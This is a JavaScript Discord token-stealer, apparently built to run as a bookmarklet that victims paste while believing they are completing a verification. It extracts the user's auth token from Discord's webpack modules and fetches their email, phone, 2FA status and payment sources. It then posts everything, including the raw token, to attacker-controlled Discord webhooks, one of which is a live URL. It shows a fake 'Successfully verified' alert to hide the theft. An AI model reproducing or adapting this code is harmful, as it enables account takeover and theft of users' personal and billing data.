var config = {
    webhook: "https://discord.com/api/webhooks/964266610531639336/Sjbm6at__BpMMUINdVWQF9K8-fJpk17qTUDq2j1bpMt394iP7XFy_08RalIRKl08TXBo"
}

var badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
};

function getNitro(flags) {
    switch (flags) {
        case 0:
            return "\`\`\`No Nitro\`\`\`";
        case 1:
            return "<:classic:896119171019067423> \`\`\`Nitro Classic\`\`\`";
        case 2:
            return "<a:boost:824036778570416129> \`\`\`Nitro Boost\`\`\`";
        default:
            return "\`\`\`No Nitro\`\`\`";

    };
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') b = "\`\`\`❌\`\`\`"
    return b;
}

javascript: 
    void 
    (
        function 
        () 
            {   

                "https://discord.com" == this.document.location.origin;

                var webhooks = [
                    "put your webhook inside here",
                ]

                for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([
                    [], {
                        get_require: (a, b, c) => a.exports = c
                    },
                    [
                        ['get_require']
                    ]
                ]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([
                    [Math.random()], {},
                    a => {
                        gg = a
                    }
                ]), gg.c)
                if (gg.c.hasOwnProperty(a)) {
                    let b = gg.c[a].exports;
                    if (b && b.__esModule && b.default)
                        for (let a in b.default) 'getToken' == a && (token = b.default.getToken())
                } token;

                var userinfo = new XMLHttpRequest();
                userinfo.open("GET", "https://discord.com/api/v8/users/@me", false);
                userinfo.setRequestHeader("Authorization", token);
                userinfo.send(null);
                userinfo.responseText;

                userinfo = JSON.parse(userinfo.responseText)

                var fields = []

                avatar_url = "https://cdn.discordapp.com/avatars/597311489287782410/{0}.gif?size=4096".replace("{0}", userinfo["avatar"])

                for (let [key, value] of Object.entries(({
                    "id": "Identifier",
                    "username": "Username",
                    "discriminator": "Discriminator",
                    "email": "E-Mail Address",
                    "verified": "E-Mail Verified",
                    "phone": "Telephone",
                    "mfa_enabled": "2FA",
                }))) {
                    fields.push({
                        "name": value,
                        "value": "\`\`\`" + userinfo[key] + "\`\`\`",
                        "inline": true
                    })
                }

                var billing = new XMLHttpRequest();
                billing.open("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false);
                billing.setRequestHeader("Authorization", token);
                billing.send(null);
                billing.responseText

                billing = JSON.parse(billing.responseText)

                var billings = "\`\`\`❌\`\`\`"
                billing.forEach(z => {
                    if (z.type == "") {
                        billings = "\`\`\`❌\`\`\`";
                    } else if (z.type == 2 && z.invalid != true) {
                        billings += "\`\`\`✔️\`\`\`" + " <:paypal:896441236062347374>";
                    } else if (z.type == 1 && z.invalid != true) {
                        billings += "\`\`\`✔️\`\`\`" + " :credit_card:";
                    } else {
                        billings = "\`\`\`❌\`\`\`";
                    };
                });

                fields.push({
                    "name": "Billing",
                    "value": billings,
                    "inline": true
                })

                fields.push({
                    "name": "Nitro",
                    "value": getNitro(userinfo["premium_type"]),
                    "inline": true
                })

                fields.push({
                    "name": "Badges",
                    "value": getBadges(userinfo["flags"]),
                    "inline": true
                })

                fields.push({
                    "name": "Token",
                    "value": "\`\`\`" + token + "\`\`\`",
                    "inline": true
                })

                for (var url of webhooks) {
                    sendToWebhook({ content: userinfo["id"], embeds: [{
                        "title": "t.me/doener2323",
                        "url": "https://t.me/doener2323",
                        "timestamp": new Date().toISOString(),
                        "color": 3553599,
                        "footer": {
                            "text": "{0} | https://t.me/doener2323".replace("{0}", userinfo["username"] + "#" + userinfo["discriminator"])
                        },
                        "thumbnail": {
                            "url": avatar_url
                        },
                        "fields": fields
                    }]}, url)
                }

                alert("Successfully verified")

                async function sendToWebhook(params, url) {

                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", url, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
                    xhr.send(JSON.stringify(params));
                }
            }
        )
    ();
